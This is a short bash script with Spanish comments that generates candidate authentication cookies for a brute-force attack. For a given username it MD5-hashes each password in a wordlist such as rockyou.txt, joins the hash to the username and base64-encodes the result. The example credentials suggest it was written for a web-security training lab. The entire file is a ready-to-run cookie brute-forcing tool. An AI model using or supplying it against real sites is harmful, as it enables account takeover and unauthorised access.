#!/bin/bash
### Util para bruteforcear cookies con igual formato de creación ###
# Te genera una string encodeada en base64 con el usuario y contraseña en md5 que tiene el siguiente formato:
# wiener:peter -> wiener:51dc30ddc473d43a6011e9ebba6ca770 ->  d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw

# Pimero introduce el usuario y luego la wordlist con contraseñas
# ./genpassmd5.sh wiener rockyou.txt
cat $2 |\
while read line;
do
 echo $1':'$(printf %s "$line" | tr -d '\r\n' | md5sum|tr -d "-")|base64|awk '{print substr($0,1,length($0)-4)}'
done
